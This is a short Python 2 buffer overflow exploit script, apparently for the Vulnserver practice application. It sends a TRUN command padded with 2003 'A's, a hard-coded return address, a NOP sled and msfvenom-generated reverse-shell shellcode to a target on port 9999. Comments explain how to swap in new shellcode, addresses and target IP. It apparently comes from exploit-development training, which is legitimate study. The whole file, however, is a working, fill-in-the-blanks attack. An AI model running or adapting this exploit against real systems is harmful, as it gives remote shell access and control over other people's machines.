#!/usr/bin/python2
import sys, socket

# Change lines 10-33 with code generated from msfvenom script
# change the address on line 35 and  37 to one you found in last step 
# Change IP and Port on line 42 to Target and Port Application is running on
# Change TRUN on line 43 to Command you are testing

overflow = (
"\xdd\xc0\xd9\x74\x24\xf4\x5a\xb8\xb8\xf1\xf3\xce\x2b\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x52\x0d\x11\x3b\x5e\x06\x54"
"\xc4\x9e\xd7\x39\x4c\x7b\xe6\x79\x2a\x08\x59\x4a\x38\x5c\x56"
"\x21\x6c\x74\xed\x47\xb9\x7b\x46\xed\x9f\xb2\x57\x5e\xe3\xd5"
"\xdb\x9d\x30\x35\xe5\x6d\x45\x34\x22\x93\xa4\x64\xfb\xdf\x1b"
"\x98\x88\xaa\xa7\x13\xc2\x3b\xa0\xc0\x93\x3a\x81\x57\xaf\x64"
"\x01\x56\x7c\x1d\x08\x40\x61\x18\xc2\xfb\x51\xd6\xd5\x2d\xa8"
"\x17\x79\x10\x04\xea\x83\x55\xa3\x15\xf6\xaf\xd7\xa8\x01\x74"
"\xa5\x76\x87\x6e\x0d\xfc\x3f\x4a\xaf\xd1\xa6\x19\xa3\x9e\xad"
"\x45\xa0\x21\x61\xfe\xdc\xaa\x84\xd0\x54\xe8\xa2\xf4\x3d\xaa"
"\xcb\xad\x9b\x1d\xf3\xad\x43\xc1\x51\xa6\x6e\x16\xe8\xe5\xe6"
"\xdb\xc1\x15\xf7\x73\x51\x66\xc5\xdc\xc9\xe0\x65\x94\xd7\xf7"
"\x8a\x8f\xa0\x67\x75\x30\xd1\xae\xb2\x64\x81\xd8\x13\x05\x4a"
"\x18\x9b\xd0\xdd\x48\x33\x8b\x9d\x38\xf3\x7b\x76\x52\xfc\xa4"
"\x66\x5d\xd6\xcc\x0d\xa4\xb1\x32\x79\x6a\xd9\xdb\x78\x72\xcb"
"\x47\xf4\x94\x81\x67\x50\x0f\x3e\x11\xf9\xdb\xdf\xde\xd7\xa6"
"\xe0\x55\xd4\x57\xae\x9d\x91\x4b\x47\x6e\xec\x31\xce\x71\xda"
"\x5d\x8c\xe0\x81\x9d\xdb\x18\x1e\xca\x8c\xef\x57\x9e\x20\x49"
"\xce\xbc\xb8\x0f\x29\x04\x67\xec\xb4\x85\xea\x48\x93\x95\x32"
"\x50\x9f\xc1\xea\x07\x49\xbf\x4c\xfe\x3b\x69\x07\xad\x95\xfd"
"\xde\x9d\x25\x7b\xdf\xcb\xd3\x63\x6e\xa2\xa5\x9c\x5f\x22\x22"
"\xe5\xbd\xd2\xcd\x3c\x06\xf2\x2f\x94\x73\x9b\xe9\x7d\x3e\xc6"
"\x09\xa8\x7d\xff\x89\x58\xfe\x04\x91\x29\xfb\x41\x15\xc2\x71"
"\xd9\xf0\xe4\x26\xda\xd0")
  
# 625011AF

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    print "\nSending Reverse Shell..."
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("x.x.x.x", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:            
    print "\nError Connecting to Server"
    sys.exit()
